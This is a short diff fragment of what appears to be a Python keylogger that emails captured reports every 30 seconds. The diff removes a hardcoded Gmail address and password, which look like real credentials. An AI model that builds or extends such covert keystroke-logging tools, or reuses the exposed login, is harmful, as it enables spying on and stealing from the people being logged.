@@ -13,8 +13,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 SEND_REPORT_EVERY = 30 # in seconds, 300 means 5 minute and so on
-EMAIL_ADDRESS = "gsnoor2k@gmail.com"
-EMAIL_PASSWORD = "Aisha942000"
+EMAIL_ADDRESS = ""
+EMAIL_PASSWORD = ""
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
